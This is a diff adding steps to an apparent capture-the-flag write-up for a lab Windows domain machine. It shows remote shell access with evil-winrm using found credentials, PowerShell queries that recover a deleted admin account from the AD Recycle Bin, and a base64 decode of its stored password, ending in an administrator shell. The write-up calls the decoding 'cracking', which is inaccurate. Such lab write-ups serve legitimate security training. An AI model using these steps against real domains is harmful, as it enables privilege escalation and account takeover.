@@ -239,3 +239,24 @@ go to run command in windows and type
 - arksvc:w3lc0meFr31nd
 - we try evilwinrm and we got a shell
 - run net user arksvc and we see intersting group (  *AD Recycle Bin)
+- searched for exploit for the group and dound command on hacktricks
+```
+Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+```
+- this  query all of the deleted objects within a domain
+- we see tempadmin deleted so we run
+```
+Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
+```
+- and we see cascadeleagcypwd
+- so crack it using base64
+```
+└─$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
+baCT3r1aN00dles
+```
+- and we got creds user tempadmin and password baCT3r1aN00dles we try evilwinrm but no luck
+- i try with user administrator and we got ashell as administrator
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
+cascade\administrator
+```
